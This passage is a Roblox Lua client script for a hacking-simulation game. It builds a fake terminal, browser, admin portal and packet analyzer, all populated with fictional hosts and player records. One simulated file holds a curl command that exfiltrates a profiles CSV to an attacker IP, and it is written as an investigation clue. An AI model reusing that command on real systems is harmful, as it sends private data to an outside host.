-- HackTablet OS (StarterPlayerScripts)
-- ONLY the needed fixes applied:
-- 1) removed debug notifications/warns
-- 2) fixed re-open after Close by resetting started state
-- 3) fixed ObjectiveManager require path to Shared

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local CAS = game:GetService("ContextActionService")
local StarterGui = game:GetService("StarterGui")
local Http = game:GetService("HttpService")
local Tween = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local ContentProvider = game:GetService("ContentProvider")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Shared = ReplicatedStorage:WaitForChild("Shared")
local ObjectiveManager = require(Shared:WaitForChild("ObjectiveManager"))

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local TOOL_NAME = "HackTablet"
local Tool = nil

local PROMPT = "rbxplayer@hackos:~$ "
local AUDIO_TAG = "HackTablet_Audio"
local E_BIND = "HackTablet_E_Block"
local BLUR_NAME = "HackStartBlur"

local SAVE_KEYS = { "Obj_Admin", "TimesLeaked" }

local isEquipped = false
local started = false

local MainGUI, HintGUI
local TermFrame, BrowserFrame, TermOut, TermInput, UrlBox, PageLabel, ClockLabel, MissionsFrame, MissionsList
local BrowserStatusLabel, BrowserContent, LinkBar
local AdminLoginPage, AdminDashboardPage, AdminUserBox, AdminPassBox, AdminLoginStatus, AdminSearchBox, AdminResultsFrame
local PacketPage, PacketToolbar, PacketListFrame, PacketIPBox, PacketDNSBox, PacketApplyBtn, PacketClearBtn, PacketFollowBtn

local DEBUG = false

local browserState = {
	adminLoggedIn = false,
	currentUrl = "about:blank",
}

local commandHistory = {}
local historyIndex = nil
local currentDraft = ""

local terminalState = {
	currentHost = "local",
	currentDir = "/",
	connectedHost = nil,
	sshSession = false,
	scanCache = nil,
	sniffCache = nil,
	lastAttackerIP = "203.44.18.77",
}

local ActivePacketCapture = {
	targetIP = "",
	targetLabel = "",
	rows = {},
}

local function makePlayerRecord(i)
	local first = { "Aiden", "Nova", "Jules", "Mika", "Riley", "Zane", "Lena", "Kai", "Iris", "Noah", "Milo", "Ava" }
	local last = { "Stone", "Mercer", "Blaze", "Skylark", "Rift", "Vale", "Keen", "Pixel", "Byte", "Crest", "Ash", "Orbit" }
	local region = { "US-West", "US-East", "EU-Central", "Asia-South", "SA-East" }
	local plans = { "Basic", "Plus", "Ultra", "Creator" }
	local status = { "Active", "Idle", "Streaming", "Recently Logged In" }

	local uname = (first[(i % #first) + 1] .. last[((i * 2) % #last) + 1] .. tostring(100 + i))
	return {
		username = uname,
		display = first[((i + 3) % #first) + 1] .. " " .. last[((i + 5) % #last) + 1],
		region = region[((i + 1) % #region) + 1],
		plan = plans[((i + 2) % #plans) + 1],
		status = status[((i + 3) % #status) + 1],
	}
end

local FakePlayerRows = {}
for i = 1, 20 do
	table.insert(FakePlayerRows, makePlayerRecord(i))
end

local SimHosts = {
	["bloxplay_itwifi"] = {
		label = "Bloxplay_ITWifi",
		ip = "192.168.32.10",
		mac = "A4:2B:11:9C:7D:10",
		server = "PulseServe",
		ports = { 53, 67, 68, 80, 443 },
		role = "Wireless gateway",
	},
	["bloxplay_adminwifi"] = {
		label = "Bloxplay_AdminWifi",
		ip = "192.168.43.2",
		mac = "B8:77:21:4E:91:02",
		server = "CorePanel",
		ports = { 22, 80, 443, 8080 },
		role = "Admin wireless gateway",
	},
	["laptop"] = {
		label = "Laptop",
		ip = "192.168.32.12",
		mac = "5C:90:23:AA:10:12",
		server = "CloudFrame",
		ports = { 53, 80, 443, 5151 },
		role = "Employee workstation",
	},
	["stream_dispatch"] = {
		label = "StreamDispatch_01",
		ip = "192.168.32.60",
		mac = "54:71:3A:CD:60:01",
		server = "StreamForge",
		ports = { 80, 443, 554, 9000 },
		role = "Session relay node",
	},
	["player_data"] = {
		label = "PlayerData_Vault",
		ip = "192.168.43.20",
		mac = "18:C0:4D:88:2A:20",
		server = "VaultLeaf",
		ports = { 22, 80, 443, 445, 3306 },
		role = "Player profile storage",
	},
	["creator_stats"] = {
		label = "CreatorStats_Node",
		ip = "192.168.43.25",
		mac = "1C:B2:6F:72:25:01",
		server = "MetricBloom",
		ports = { 80, 443, 9200 },
		role = "Creator analytics server",
	},
	["frontdesk_pc"] = {
		label = "FrontDesk_PC",
		ip = "192.168.32.22",
		mac = "2C:6D:C1:77:44:22",
		server = "DeskWave",
		ports = { 53, 80, 443 },
		role = "Reception workstation",
	},
	["security_cam_hall"] = {
		label = "SecurityCam_Hall",
		ip = "192.168.32.31",
		mac = "90:4F:DA:3B:20:31",
		server = "LensTrack",
		ports = { 80, 443, 554 },
		role = "Hallway camera",
	},
	["printer_ops"] = {
		label = "Printer_Ops",
		ip = "192.168.32.44",
		mac = "44:B1:FA:21:66:44",
		server = "InkPort",
		ports = { 80, 443, 9100 },
		role = "Office printer",
	},
	["backup_node"] = {
		label = "Backup_Node",
		ip = "192.168.43.55",
		mac = "70:AF:24:91:55:55",
		server = "EchoKeep",
		ports = { 22, 80, 443, 873 },
		role = "Backup system",
	},
}

local SimFSByHost = {
	localhost = {
		["/"] = { "home", "logs", "tmp", "notes.txt", "readme.txt", "capture.pcap" },
		["/home"] = { "player.txt", "chapter1.txt", "mail.txt" },
		["/logs"] = { "system.log", "network.log" },
		["/tmp"] = { "cache.dat" },
	},
	["playerdata_vault"] = {
		["/"] = { "home", "var", "etc", "srv", "auth.log", "report.txt", "sync_jobs.sh", "player_profiles.db" },
		["/home"] = { "admin.txt", "ops.txt" },
		["/var"] = { "www", "backups", "tmp" },
		["/etc"] = { "passwd", "sshd_config", "firewall.rules" },
		["/srv"] = { "profiles.csv", "sessions.csv", "payouts.csv" },
	},
}

local function buildPlayerProfilesCSV()
	local lines = { "username,display_name,region,plan,status" }
	for _, row in ipairs(FakePlayerRows) do
		table.insert(lines, table.concat({ row.username, row.display, row.region, row.plan, row.status }, ","))
	end
	return table.concat(lines, "\n")
end

local SimFileContentsByHost = {
	localhost = {
		["readme.txt"] = "HackOS SIM filesystem.\nEverything here is fictional.",
		["notes.txt"] = "Training flow:\n1) scan nearby networks\n2) inspect packets\n3) connect safely\n4) investigate logs",
		["capture.pcap"] = "PCAP SUMMARY (SIM)\n- weak WiFi observed\n- admin credential-like packet seen\n- outbound beacon flagged",
		["player.txt"] = "Local profile (SIM)\nuser=rbxplayer\nrole=junior analyst",
		["chapter1.txt"] = "Hint:\nTry scan nearby\nThen sniff 192.168.32.12\nThen packets",
		["mail.txt"] = "Inbox preview (SIM)\nOne suspicious message references 'urgent account verification'",
		["system.log"] = "[00:10] boot ok\n[00:11] terminal ready\n[00:12] browser renderer online",
		["network.log"] = "[net] Bloxplay_ITWifi seen\n[net] Bloxplay_AdminWifi seen\n[net] PlayerData_Vault referenced in captured traffic",
		["cache.dat"] = "temporary cache blob (sim)",
	},
	["playerdata_vault"] = {
		["auth.log"] = table.concat({
			"2026-03-24 08:02:14 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
			"2026-03-24 08:02:27 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
			"2026-03-24 08:04:08 sshd[1322]: Accepted password for bloxplay-admin from 192.168.32.12",
			"2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77",
		}, "\n"),
		["report.txt"] = "Server report (SIM)\n- outbound traffic spike detected\n- investigate running processes\n- review netstat output",
		["sync_jobs.sh"] = "#!/bin/sh\n# simulated exfil script\ncurl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv",
		["admin.txt"] = "admin home note (SIM)\nPassword changed recently after incident drills.",
		["ops.txt"] = "ops note (SIM)\nIf traffic spikes, inspect psrep and netstat first.",
		["passwd"] = "root:x:0:0\nbloxplay-admin:x:1001:1001\nbackup:x:1002:1002",
		["sshd_config"] = "PermitRootLogin no\nPasswordAuthentication yes\nAllowUsers bloxplay-admin backup",
		["firewall.rules"] = "ALLOW 192.168.0.0/16\nDENY 0.0.0.0/0 -> 23/tcp",
		["player_profiles.db"] = "profile store (sim)",
		["profiles.csv"] = buildPlayerProfilesCSV(),
		["sessions.csv"] = "session_id,username,node,status\nS1,ByteCrest109,StreamDispatch_01,active\nS2,NoahStone103,StreamDispatch_01,active",
		["payouts.csv"] = "creator_id,month,credits\nC-100,Mar,1200\nC-101,Mar,980",
	},
}

local OpenFiles = {}
local SimProcessesByHost = {
	localhost = {
		{ pid = 101, name = "hackos-shell", status = "Running" },
		{ pid = 214, name = "browser-render", status = "Sleeping" },
		{ pid = 337, name = "packet-analyzer", status = "Running" },
		{ pid = 404, name = "mail-decoy-check", status = "Idle" },
	},
	["playerdata_vault"] = {
		{ pid = 602, name = "sshd", status = "Running" },
		{ pid = 774, name = "vaultleafd", status = "Running" },
		{ pid = 911, name = "profile-sync", status = "Sleeping" },
		{ pid = 1337, name = "sync_jobs.sh", status = "Running" },
	},
}

local FakeAdminRecords = {
	{ username = "rick_dev", role = "Developer", dept = "Systems", note = "Reset password requested last week." },
	{ username = "novaplayz", role = "Moderator", dept = "Community", note = "Remote login from 192.168.32.12 flagged." },
	{ username = "marcus_lee", role = "IT Support", dept = "Infrastructure", note = "Accessed PlayerData_Vault successfully." },
	{ username = "junpark", role = "Security Analyst", dept = "Security", note = "Left note about weak WiFi segmentation." },
	{ username = "bloxplay-admin", role = "Administrator", dept = "Core Ops", note = "Credentials spotted in simulated HTTP traffic." },
	{ username = "vault_ops", role = "Data Steward", dept = "Trust & Safety", note = "PlayerData_Vault exposes user profile sync logs." },
}

local PAGES = {
	["hackos://home"] =
		"Welcome to HackOS (SIM)\n\nQuick Links:\n- hackos://tips\n- hackos://apps\n- RBXPacketNet.com\n- bloxplay.com/admin\n\nTraining Path:\n1) Scan nearby devices\n2) Inspect targeted packet traffic\n3) Pivot to PlayerData_Vault\n4) Review logs and processes\n5) Stop the attacker",

	["hackos://tips"] =
		"Safety Tips (SIM)\n\n- Use strong passwords\n- Turn on 2FA\n- Verify suspicious login pages\n- Review logs after incidents",

	["hackos://apps"] =
		"Apps (SIM)\n- Terminal\n- Browser\n- Packet Analyzer (RBXPacketNet.com)\n- Admin Portal (bloxplay.com/admin)",

	["bloxplay.com/admin"] =
		"BLOXPLAY ADMIN LOGIN (SIM)\nUse the browser login form.",

	["www.bloxplay.com/admin"] =
		"BLOXPLAY ADMIN LOGIN (SIM)\nUse the browser login form.",

	["rbxpacketnet.com"] =
		"RBXPacketNet (SIM)\nBrowser packet analyzer ready.",

	["www.rbxpacketnet.com"] =
		"RBXPacketNet (SIM)\nBrowser packet analyzer ready.",
}

local function notify(t)
	pcall(function()
		StarterGui:SetCore("SendNotification", t)
	end)
end

local function dbg(_msg)
end

local function mk(t, p)
	local i = Instance.new(t)
	for k, v in pairs(p or {}) do
		i[k] = v
	end
	return i
end

local function round(o, r)
	mk("UICorner", { Parent = o, CornerRadius = UDim.new(0, r or 10) })
end

local function fadeVol(s, v, d)
	if not s then return end
	pcall(function()
		Tween:Create(s, TweenInfo.new(d or 0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
			Volume = math.clamp(v, 0, 10),
		}):Play()
	end)
end

notify({ Title = "SIMULATION WARNING", Text = "Simulated interface. Do not replicate in real life.", Duration = 5 })

pcall(function()
	if Player:GetAttribute("HasKeycardData") ~= nil then
		Player:SetAttribute("HasKeycardData", nil)
	end
end)

local function getSound()
	local s = SoundService:FindFirstChild(AUDIO_TAG)
	if s and s:IsA("Sound") then
		return s
	end
	s = mk("Sound", {
		Name = AUDIO_TAG,
		SoundId = "rbxassetid://74606780873749",
		Volume = 0,
		Looped = false,
		Parent = SoundService,
	})
	task.spawn(function()
		pcall(function()
			ContentProvider:PreloadAsync({ s })
		end)
	end)
	return s
end

local function playAudio()
	local s = getSound()
	if not s.IsPlaying then
		s.TimePosition = 0
		s:Play()
	end
	fadeVol(s, 0.95, 0.4)
end

local function stopAudio()
	local s = SoundService:FindFirstChild(AUDIO_TAG)
	if not s then return end
	fadeVol(s, 0, 0.25)
	task.delay(0.3, function()
		if s and s.IsPlaying then
			s:Stop()
		end
	end)
end

local function isToolEquipped()
	local c = Player.Character
	return (Tool and c and Tool.Parent == c) or isEquipped
end

local function setEquipped(on)
	isEquipped = on
	Player:SetAttribute("HackTabletEquipped", on)
end

local function saveNow()
	local out = {}
	for _, k in ipairs(SAVE_KEYS) do
		local v = Player:GetAttribute(k)
		if v ~= nil then
			out[k] = v
		end
	end
	Player:SetAttribute("SaveBlob", Http:JSONEncode(out))
	notify({ Title = "HackTablet", Text = "Progress saved.", Duration = 2 })
end

local function loadNow()
	local raw = Player:GetAttribute("SaveBlob")
	if type(raw) ~= "string" or #raw == 0 then
		return
	end
	local ok, data = pcall(function()
		return Http:JSONDecode(raw)
	end)
	if not ok or type(data) ~= "table" then
		return
	end
	for k, v in pairs(data) do
		Player:SetAttribute(k, v)
	end
	notify({ Title = "HackTablet", Text = "Progress loaded.", Duration = 2 })
end

local function teardownStart()
	local blur = Lighting:FindFirstChild(BLUR_NAME)
	if blur then blur:Destroy() end
	local boot = PlayerGui:FindFirstChild("HackStart")
	if boot then boot:Destroy() end
end

local function addLine(txt, color)
	mk("TextLabel", {
		Parent = TermOut,
		BackgroundTransparency = 1,
		Font = Enum.Font.Code,
		TextSize = 15,
		TextColor3 = color or Color3.fromRGB(172, 255, 198),
		TextXAlignment = Enum.TextXAlignment.Left,
		TextWrapped = true,
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, -10, 0, 0),
		Text = txt,
	})
	task.defer(function()
		local layout = TermOut:FindFirstChild("UIListLayout")
		if layout then
			TermOut.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
			TermOut.CanvasPosition = Vector2.new(0, math.huge)
		end
	end)
end

local function normalizeUrl(url)
	local u = tostring(url or ""):gsub("^%s+", ""):gsub("%s+$", "")
	if u == "" then return "about:blank" end
	local low = u:lower()

	if low == "home" then return "hackos://home" end
	if low == "tips" then return "hackos://tips" end
	if low == "apps" then return "hackos://apps" end
	if low == "packetanalyzer" or low == "rbxpacketnet" then return "rbxpacketnet.com" end

	if low:sub(1, 8) == "hackos://" then
		return low
	end

	low = low:gsub("^https?://", ""):gsub("/+$", "")
	return low
end

local function setBrowserStatus(text)
	if BrowserStatusLabel then
		BrowserStatusLabel.Text = text or ""
	end
end

local function hideAllBrowserPages()
	if AdminLoginPage then AdminLoginPage.Visible = false end
	if AdminDashboardPage then AdminDashboardPage.Visible = false end
	if PacketPage then PacketPage.Visible = false end
	if PageLabel then PageLabel.Visible = false end
end

local function randomChoice(t)
	return t[math.random(1, #t)]
end

local function getAllHostsList()
	local out = {}
	for _, host in pairs(SimHosts) do
		table.insert(out, host)
	end
	table.sort(out, function(a, b)
		return a.label < b.label
	end)
	return out
end

local function getHostByIP(ip)
	ip = tostring(ip or "")
	for _, host in pairs(SimHosts) do
		if host.ip == ip then
			return host
		end
	end
	return nil
end

local function startPacketCaptureForIP(ip)
	local host = getHostByIP(ip)
	if not host then
		ActivePacketCapture.targetIP = ""
		ActivePacketCapture.targetLabel = ""
		ActivePacketCapture.rows = {}
		return false
	end

	local protocols = { "TCP", "UDP", "DNS", "HTTP", "HTTPS" }
	local dnsNames = {
		"bloxplay.com",
		"admin.bloxplay.local",
		"playerdata.bloxplay.local",
		"streamrelay.bloxplay.net",
		"cdn.bloxplay.net",
		"auth.bloxplay.local",
		"creatorhub.bloxplay.local",
	}

	local peerHosts = getAllHostsList()
	local rows = {}
	local count = math.random(10, 16)

	for _ = 1, count do
		local proto = randomChoice(protocols)
		local peer = randomChoice(peerHosts)
		local srcIP, dstIP
		local dnsText = randomChoice(dnsNames)
		local port = tostring(randomChoice(host.ports))
		local serverName = host.server

		if math.random() < 0.5 then
			srcIP = host.ip
			dstIP = peer.ip
		else
			srcIP = peer.ip
			dstIP = host.ip
		end

		if proto == "DNS" then
			port = tostring(randomChoice({ 53, 5353 }))
			serverName = "NameMesh"
		elseif proto == "HTTP" then
			port = "80"
		elseif proto == "HTTPS" then
			port = "443"
		elseif proto == "TCP" then
			port = tostring(randomChoice(host.ports))
		elseif proto == "UDP" then
			port = tostring(randomChoice(host.ports))
		end

		table.insert(rows, {
			ip = host.ip,
			protocol = proto,
			dns = dnsText,
			port = port,
			server = serverName,
			src = srcIP,
			dst = dstIP,
		})
	end

	ActivePacketCapture.targetIP = host.ip
	ActivePacketCapture.targetLabel = host.label
	ActivePacketCapture.rows = rows
	return true
end

local function renderAdminResults(query)
	if not AdminResultsFrame then return end
	query = tostring(query or ""):lower()

	for _, child in ipairs(AdminResultsFrame:GetChildren()) do
		if child:IsA("Frame") then
			child:Destroy()
		end
	end

	local layout = AdminResultsFrame:FindFirstChild("UIListLayout")
	if not layout then
		layout = mk("UIListLayout", {
			Parent = AdminResultsFrame,
			Name = "UIListLayout",
			Padding = UDim.new(0, 6),
			SortOrder = Enum.SortOrder.LayoutOrder,
		})
	end

	local count = 0

	for _, row in ipairs(FakeAdminRecords) do
		local hay = (row.username .. " " .. row.role .. " " .. row.dept .. " " .. row.note):lower()
		if query == "" or hay:find(query, 1, true) then
			count += 1
			local card = mk("Frame", {
				Parent = AdminResultsFrame,
				BackgroundColor3 = Color3.fromRGB(246, 248, 252),
				BorderSizePixel = 0,
				Size = UDim2.new(1, -10, 0, 92),
			})
			round(card, 8)

			mk("TextLabel", {
				Parent = card,
				BackgroundTransparency = 1,
				Text = "USER: " .. row.username,
				Font = Enum.Font.GothamBold,
				TextSize = 14,
				TextColor3 = Color3.fromRGB(25, 30, 38),
				TextXAlignment = Enum.TextXAlignment.Left,
				Position = UDim2.new(0, 10, 0, 8),
				Size = UDim2.new(1, -20, 0, 18),
			})

			mk("TextLabel", {
				Parent = card,
				BackgroundTransparency = 1,
				Text = "ROLE: " .. row.role .. "    DEPT: " .. row.dept,
				Font = Enum.Font.Code,
				TextSize = 13,
				TextColor3 = Color3.fromRGB(45, 52, 64),
				TextXAlignment = Enum.TextXAlignment.Left,
				Position = UDim2.new(0, 10, 0, 30),
				Size = UDim2.new(1, -20, 0, 16),
			})

			mk("TextLabel", {
				Parent = card,
				BackgroundTransparency = 1,
				TextWrapped = true,
				TextYAlignment = Enum.TextYAlignment.Top,
				Text = "NOTE: " .. row.note,
				Font = Enum.Font.Gotham,
				TextSize = 13,
				TextColor3 = Color3.fromRGB(65, 74, 88),
				TextXAlignment = Enum.TextXAlignment.Left,
				Position = UDim2.new(0, 10, 0, 50),
				Size = UDim2.new(1, -20, 0, 34),
			})
		end
	end

	for _, row in ipairs(FakePlayerRows) do
		local hay = ("player " .. row.username .. " " .. row.display .. " " .. row.region .. " " .. row.plan .. " " .. row.status):lower()
		if query ~= "" and hay:find(query, 1, true) then
			count += 1
			local card = mk("Frame", {
				Parent = AdminResultsFrame,
				BackgroundColor3 = Color3.fromRGB(240, 247, 255),
				BorderSizePixel = 0,
				Size = UDim2.new(1, -10, 0, 92),
			})
			round(card, 8)

			mk("TextLabel", {
				Parent = card,
				BackgroundTransparency = 1,
				Text = "PLAYER: " .. row.username .. " (" .. row.display .. ")",
				Font = Enum.Font.GothamBold,
				TextSize = 14,
				TextColor3 = Color3.fromRGB(25, 30, 38),
				TextXAlignment = Enum.TextXAlignment.Left,
				Position = UDim2.new(0, 10, 0, 8),
				Size = UDim2.new(1, -20, 0, 18),
			})

			mk("TextLabel", {
				Parent = card,
				BackgroundTransparency = 1,
				Text = "REGION: " .. row.region .. "    PLAN: " .. row.plan,
				Font = Enum.Font.Code,
				TextSize = 13,
				TextColor3 = Color3.fromRGB(45, 52, 64),
				TextXAlignment = Enum.TextXAlignment.Left,
				Position = UDim2.new(0, 10, 0, 30),
				Size = UDim2.new(1, -20, 0, 16),
			})

			mk("TextLabel", {
				Parent = card,
				BackgroundTransparency = 1,
				Text = "STATUS: " .. row.status,
				Font = Enum.Font.Gotham,
				TextSize = 13,
				TextColor3 = Color3.fromRGB(65, 74, 88),
				TextXAlignment = Enum.TextXAlignment.Left,
				Position = UDim2.new(0, 10, 0, 52),
				Size = UDim2.new(1, -20, 0, 20),
			})
		end
	end

	if count == 0 then
		local empty = mk("Frame", {
			Parent = AdminResultsFrame,
			BackgroundColor3 = Color3.fromRGB(246, 248, 252),
			BorderSizePixel = 0,
			Size = UDim2.new(1, -10, 0, 48),
		})
		round(empty, 8)

		mk("TextLabel", {
			Parent = empty,
			BackgroundTransparency = 1,
			Text = "No database results found (sim).",
			Font = Enum.Font.Gotham,
			TextSize = 14,
			TextColor3 = Color3.fromRGB(65, 74, 88),
			TextXAlignment = Enum.TextXAlignment.Left,
			Position = UDim2.new(0, 10, 0, 12),
			Size = UDim2.new(1, -20, 0, 20),
		})
	end

	task.defer(function()
		AdminResultsFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end

local function showTextPage(text, status)
	hideAllBrowserPages()
	if PageLabel then
		PageLabel.Visible = true
		PageLabel.Text = text or ""
	end
	setBrowserStatus(status or "Static page loaded (sim)")
end

local function showAdminLoginPage(url)
	hideAllBrowserPages()
	if AdminLoginPage then
		AdminLoginPage.Visible = true
	end
	setBrowserStatus(("Loaded %s (sim auth required)"):format(url))
end

local function showAdminDashboard(url)
	hideAllBrowserPages()
	if AdminDashboardPage then
		AdminDashboardPage.Visible = true
	end
	renderAdminResults(AdminSearchBox and AdminSearchBox.Text or "")
	setBrowserStatus(("Authenticated to %s (sim)"):format(url))
end

local function packetMatchesFilter(pkt, dnsFilter)
	dnsFilter = tostring(dnsFilter or ""):lower()
	if dnsFilter == "" then
		return true
	end
	local blob = (pkt.dns .. " " .. pkt.server .. " " .. pkt.protocol .. " " .. pkt.src .. " " .. pkt.dst):lower()
	return blob:find(dnsFilter, 1, true) ~= nil
end

local function populatePacketRows()
	if not PacketListFrame then return end

	for _, child in ipairs(PacketListFrame:GetChildren()) do
		if child:IsA("Frame") then
			child:Destroy()
		end
	end

	local layout = PacketListFrame:FindFirstChild("UIListLayout")
	if not layout then
		layout = mk("UIListLayout", {
			Parent = PacketListFrame,
			Name = "UIListLayout",
			Padding = UDim.new(0, 6),
			SortOrder = Enum.SortOrder.LayoutOrder,
		})
	end

	local ipFilter = PacketIPBox and PacketIPBox.Text or ""
	local dnsFilter = PacketDNSBox and PacketDNSBox.Text or ""
	local host = getHostByIP(ipFilter)
	local rows = {}

	if host then
		if ActivePacketCapture.targetIP ~= host.ip then
			startPacketCaptureForIP(host.ip)
		end
		for _, row in ipairs(ActivePacketCapture.rows) do
			if packetMatchesFilter(row, dnsFilter) then
				table.insert(rows, row)
			end
		end
	end

	if not host then
		local row = mk("Frame", {
			Parent = PacketListFrame,
			BackgroundColor3 = Color3.fromRGB(244, 247, 252),
			BorderSizePixel = 0,
			Size = UDim2.new(1, -10, 0, 54),
		})
		round(row, 8)

		mk("TextLabel", {
			Parent = row,
			BackgroundTransparency = 1,
			Text = "Enter a valid target IP to begin capture (sim).",
			Font = Enum.Font.Gotham,
			TextSize = 14,
			TextColor3 = Color3.fromRGB(55, 66, 82),
			TextXAlignment = Enum.TextXAlignment.Left,
			Position = UDim2.new(0, 10, 0, 16),
			Size = UDim2.new(1, -20, 0, 20),
		})
	elseif #rows == 0 then
		local row = mk("Frame", {
			Parent = PacketListFrame,
			BackgroundColor3 = Color3.fromRGB(244, 247, 252),
			BorderSizePixel = 0,
			Size = UDim2.new(1, -10, 0, 54),
		})
		round(row, 8)

		mk("TextLabel", {
			Parent = row,
			BackgroundTransparency = 1,
			Text = "No packets match the current DNS filter (sim).",
			Font = Enum.Font.Gotham,
			TextSize = 14,
			TextColor3 = Color3.fromRGB(55, 66, 82),
			TextXAlignment = Enum.TextXAlignment.Left,
			Position = UDim2.new(0, 10, 0, 16),
			Size = UDim2.new(1, -20, 0, 20),
		})
	end

	for _, pkt in ipairs(rows) do
		local row = mk("Frame", {
			Parent = PacketListFrame,
			BackgroundColor3 = Color3.fromRGB(244, 247, 252),
			BorderSizePixel = 0,
			Size = UDim2.new(1, -10, 0, 96),
		})
		round(row, 8)

		mk("TextLabel", {
			Parent = row,
			BackgroundTransparency = 1,
			Text = "IP: " .. pkt.ip .. "    PROTOCOL: " .. pkt.protocol,
			Font = Enum.Font.GothamBold,
			TextSize = 13,
			TextColor3 = Color3.fromRGB(20, 20, 28),
			TextXAlignment = Enum.TextXAlignment.Left,
			Position = UDim2.new(0, 10, 0, 6),
			Size = UDim2.new(1, -20, 0, 18),
		})

		mk("TextLabel", {
			Parent = row,
			BackgroundTransparency = 1,
			Text = "SRC: " .. pkt.src .. "    DST: " .. pkt.dst,
			Font = Enum.Font.Code,
			TextSize = 12,
			TextColor3 = Color3.fromRGB(35, 45, 60),
			TextXAlignment = Enum.TextXAlignment.Left,
			Position = UDim2.new(0, 10, 0, 26),
			Size = UDim2.new(1, -20, 0, 16),
		})

		mk("TextLabel", {
			Parent = row,
			BackgroundTransparency = 1,
			Text = "DNS: " .. pkt.dns,
			Font = Enum.Font.Code,
			TextSize = 12,
			TextColor3 = Color3.fromRGB(35, 45, 60),
			TextXAlignment = Enum.TextXAlignment.Left,
			Position = UDim2.new(0, 10, 0, 44),
			Size = UDim2.new(1, -20, 0, 16),
		})

		mk("TextLabel", {
			Parent = row,
			BackgroundTransparency = 1,
			Text = "PORT: " .. pkt.port .. "    SERVER: " .. pkt.server,
			Font = Enum.Font.Code,
			TextSize = 12,
			TextColor3 = Color3.fromRGB(35, 45, 60),
			TextXAlignment = Enum.TextXAlignment.Left,
			Position = UDim2.new(0, 10, 0, 62),
			Size = UDim2.new(1, -20, 0, 16),
		})
	end

	task.defer(function()
		PacketListFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end

local function showPacketPage(url)
	hideAllBrowserPages()
	if PacketPage then
		PacketPage.Visible = true
	end
	populatePacketRows()
	setBrowserStatus(("Loaded %s packet analyzer (sim)"):format(url))
end

local function navigateTo(url)
	local uNorm = normalizeUrl(url)
	browserState.currentUrl = uNorm

	if UrlBox then
		UrlBox.Text = uNorm == "about:blank" and "" or uNorm
	end

	if uNorm == "about:blank" then
		showTextPage("", "")
		return
	end

	if uNorm == "bloxplay.com/admin" or uNorm == "www.bloxplay.com/admin" then
		if browserState.adminLoggedIn then
			showAdminDashboard(uNorm)
		else
			showAdminLoginPage(uNorm)
		end
		return
	end

	if uNorm == "rbxpacketnet.com" or uNorm == "www.rbxpacketnet.com" then
		showPacketPage(uNorm)
		return
	end

	showTextPage(PAGES[uNorm] or ('No renderer for "%s" (sim).'):format(url), "Page loaded (sim)")
end

local function getHostKey()
	if terminalState.currentHost == "PlayerData_Vault" then
		return "playerdata_vault"
	end
	return terminalState.currentHost == "local" and "localhost" or "localhost"
end

local function getFS()
	local host = getHostKey()
	return SimFSByHost[host] or SimFSByHost.localhost
end

local function getContents()
	local host = getHostKey()
	return SimFileContentsByHost[host] or SimFileContentsByHost.localhost
end

local function getProcesses()
	local host = getHostKey()
	return SimProcessesByHost[host] or SimProcessesByHost.localhost
end

local function pathLeaf(path)
	local s = tostring(path or ""):gsub("^%s+", ""):gsub("%s+$", "")
	s = s:gsub("^/+", "")
	local parts = {}
	for part in s:gmatch("[^/]+") do
		parts[#parts + 1] = part
	end
	return parts[#parts] or s
end

local function listPath(path)
	local p = tostring(path or "")
	if p == "" then p = terminalState.currentDir end
	local fs = getFS()
	local list = fs[p]
	if not list then
		addLine(("ls: cannot access '%s': No such file or directory (sim)"):format(p))
		return
	end
	addLine(("Listing %s on %s (sim)"):format(p, terminalState.currentHost))
	for _, name in ipairs(list) do
		addLine("  " .. name)
	end
end

local function catFile(path)
	local name = pathLeaf(path)
	local contents = getContents()
	local content = contents[name]
	if not content then
		addLine(("cat: %s: No such file (sim)"):format(tostring(path)))
		return
	end
	addLine(("--- %s ---"):format(name))
	for line in tostring(content):gmatch("[^\n]+") do
		addLine(line)
	end
end

local function openFile(path)
	local name = pathLeaf(path)
	local contents = getContents()
	if not contents[name] then
		addLine(("openfile: %s not found (sim)"):format(tostring(path)))
		return
	end
	OpenFiles[name] = true
	addLine(("Opened %s (sim)"):format(name))
end

local function closeFile(path)
	local name = pathLeaf(path)
	if OpenFiles[name] then
		OpenFiles[name] = nil
		addLine(("Closed %s (sim)"):format(name))
	else
		addLine(("closefile: %s is not open (sim)"):format(name))
	end
end

local function removeFile(path)
	local name = pathLeaf(path)
	local contents = getContents()
	local fs = getFS()
	if contents[name] then
		contents[name] = nil
		OpenFiles[name] = nil
		for _, items in pairs(fs) do
			for i = #items, 1, -1 do
				if items[i] == name then
					table.remove(items, i)
				end
			end
		end
		addLine(("Removed %s (sim)"):format(name))
	else
		addLine(("rm: cannot remove '%s': No such file (sim)"):format(tostring(path)))
	end
end

local function showScan(target)
	target = target ~= "" and target:lower() or "nearby"
	addLine(("Scan target: %s (sim)"):format(target))
	if target == "nearby" then
		for _, info in ipairs(getAllHostsList()) do
			addLine(("%s [%s]  open:%s  role:%s"):format(
				info.label,
				info.ip,
				table.concat(info.ports, ", "),
				info.role
			))
		end
		addLine("Hint: try inspect 192.168.32.12 or 192.168.43.20 (sim)")
		terminalState.scanCache = "192.168.32.12"
		return
	end

	local host = getHostByIP(target)
	if not host then
		addLine("No host found in scan range (sim).")
		return
	end

	addLine(("Host: %s"):format(host.label))
	addLine(("IP: %s"):format(host.ip))
	addLine(("Ports: %s"):format(table.concat(host.ports, ", ")))
	addLine(("Service Family: %s"):format(host.server))
	addLine(("Role: %s"):format(host.role))
end

local function showSniff(target)
	target = target ~= "" and target or "192.168.32.12"
	local host = getHostByIP(target)
	if not host then
		addLine("sniff: unknown target ip (sim)")
		return
	end
